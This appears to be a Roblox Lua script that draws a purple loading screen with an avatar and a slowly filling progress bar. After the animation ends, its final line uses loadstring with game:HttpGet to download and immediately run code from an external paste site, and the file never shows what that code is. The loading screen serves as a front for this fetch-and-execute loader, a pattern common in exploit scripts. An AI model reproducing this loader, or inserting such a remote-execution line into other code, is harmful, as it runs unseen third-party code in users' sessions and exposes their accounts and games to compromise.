-- main.lua
-- Loading Screen by Amisu (purple theme with avatar)

local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))

-- Background
gui.IgnoreGuiInset = true

-- Avatar icon
local avatar = Instance.new("ImageLabel", gui)
avatar.Size = UDim2.new(0, 100, 0, 100)
avatar.Position = UDim2.new(0.5, -50, 0.3, 0)
avatar.BackgroundTransparency = 1
avatar.Image = "https://files.catbox.moe/4fzfzy.png"
avatar.ImageColor3 = Color3.fromRGB(170, 0, 255) -- purple tint
avatar.ScaleType = Enum.ScaleType.Fit

-- Message text
local message = Instance.new("TextLabel", gui)
message.Size = UDim2.new(1, 0, 0.05, 0)
message.Position = UDim2.new(0, 0, 0.5, 0)
message.BackgroundTransparency = 1
message.Text = "PLEASE WAIT UNTIL LOADING COMPLETES"
message.TextColor3 = Color3.fromRGB(170, 0, 255)
message.TextScaled = true
message.Font = Enum.Font.SourceSansBold

-- Progress bar background
local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 300, 0, 20)
frame.Position = UDim2.new(0.5, -150, 0.6, 0)
frame.BackgroundColor3 = Color3.fromRGB(51, 51, 51)
frame.BorderSizePixel = 0

-- Progress bar fill
local bar = Instance.new("Frame", frame)
bar.Size = UDim2.new(0, 0, 1, 0)
bar.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
bar.BorderSizePixel = 0

-- Status text
local status = Instance.new("TextLabel", gui)
status.Size = UDim2.new(1, 0, 0.05, 0)
status.Position = UDim2.new(0, 0, 0.65, 0)
status.BackgroundTransparency = 1
status.TextColor3 = Color3.fromRGB(170, 0, 255)
status.TextScaled = true
status.Text = "Loading…"

-- Animate loading slowly
for i = 1, 100 do
    bar.Size = UDim2.new(i/100, 0, 1, 0)
    status.Text = "Loading… " .. i .. "%"
    task.wait(0.1) -- slow speed
end

status.Text = "Loading Complete!"
task.wait(1)
gui:Destroy()

-- Automatically execute external script
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/jC2Zar7s3c/0"))()
